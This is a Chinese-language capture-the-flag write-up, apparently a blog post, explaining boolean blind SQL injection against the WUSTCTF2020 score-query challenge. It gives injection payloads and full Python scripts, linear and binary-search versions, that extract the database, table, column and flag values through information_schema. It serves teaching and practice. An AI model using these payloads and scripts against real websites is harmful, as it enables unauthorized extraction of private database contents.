# [WUSTCTF2020]颜值成绩查询 布尔注入二分法

这道题很简单 就是sql注入

我们来学习一下如何写盲注脚本

```cobol
?stunum=1
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/c944162ec41ecccbe2e56f9d1c310660.png" alt="" style="max-height:355px; box-sizing:content-box;" />


```cobol
?stunum=123
```





<img src="https://i-blog.csdnimg.cn/blog_migrate/1c20f72032410ce3576967633dc213de.png" alt="" style="max-height:281px; box-sizing:content-box;" />


正确回显 100  错误 显示 not 。。。

这里很显然就是盲注了

我们来写个语句查询

```lisp
if(ascii(substr(database(),1,1))>1,1,0)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/fa91b813a22709d83dd840c03d829d3f.png" alt="" style="max-height:170px; box-sizing:content-box;" />


发现回显了 我们可以开始编写脚本跑了

```cobol
import requests
import time
 
base_url="http://6199a6c3-30ca-4b13-955a-23ee81146566.node4.buuoj.cn:81/?stunum="
data=''
 
for i in range(1,200):   #位数
    for j in range(1,128):    #ascii码值
        payload = "if(ascii(substr(database(),{},1))={},1,0)".format(i,j)
        r=requests.get(url=base_url+payload)
        if(r.status_code==429):   #设置睡眠
            time.sleep(0.5)
        if r"Hi admin, your score is: 100" in r.text:   #设置成功条件
            data+=chr(j)
            print(data)
```

database=ctf

接下来就是爆破表和字段了

```cobol
if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)="ctf"),1,1))>1,1,0)
```

table_name=flag

回显了 就拿这个去咯

字段

```cobol
if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),1,1)>1,1,0)
```

cloumn=flag,value

```lisp
if(ascii(substr((select(group_concat(flag,value))from(ctf.flag)),1,1))>1,1,0)
```

最后的成品是这样

```cobol
import requests
import time
 
base_url="http://6199a6c3-30ca-4b13-955a-23ee81146566.node4.buuoj.cn:81/?stunum="
data=''
 
for i in range(1,200):   #位数
    for j in range(1,128):    #ascii码值
        payload = "if(ascii(substr(database(),{},1))={},1,0)".format(i,j)
        payload2 = 'if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)="ctf"),{},1))={},1,0)'.format(i,j)
        payload3="if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))={},1,0)".format(i,j)
        payload4="if(ascii(substr((select(group_concat(value))from(ctf.flag)),{},1))={},1,0)".format(i,j)
        r=requests.get(url=base_url+payload4)
        if(r.status_code==429):   #设置睡眠
            time.sleep(0.5)
        if r"Hi admin, your score is: 100" in r.text:   #设置成功条件
            data+=chr(j)
            print(data)
```

但是很慢

我们使用二分法来写一遍

```cobol
import requests
 
base_url="http://6199a6c3-30ca-4b13-955a-23ee81146566.node4.buuoj.cn:81/?stunum="
data=''
payload="if(ascii(substr(database(),{},1))>{},1,0)"
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        payload1=payload.format(i,mid)
        r = requests.get(url=base_url+payload1)
        if "Hi admin, your score is: 100" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    data+=chr(mid)
    print(data)
```

爆破出数据库

最后脚本

```cobol
import requests
 
base_url="http://6199a6c3-30ca-4b13-955a-23ee81146566.node4.buuoj.cn:81/?stunum="
data=''
payload="if(ascii(substr(database(),{},1))>{},1,0)"
payload2="if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),{},1))>{},1,0)"
payload3="if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))>{},1,0)"
payload4="if(ascii(substr((select(group_concat(flag,'---',value))from(ctf.flag)),{},1))>{},1,0)"
for i in range(1,10000):
    low = 32
    high = 128
    mid =(low + high) // 2
    while(low < high):
        payload1=payload4.format(i,mid)
        r = requests.get(url=base_url+payload1)
        if "Hi admin, your score is: 100" in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) // 2
    if (mid == 32 or mid == 132):
        break
    data+=chr(mid)
    print(data)
```



<img src="https://i-blog.csdnimg.cn/blog_migrate/9ab2b1bcbde67224dd95563d4c9dc95e.png" alt="" style="max-height:180px; box-sizing:content-box;" />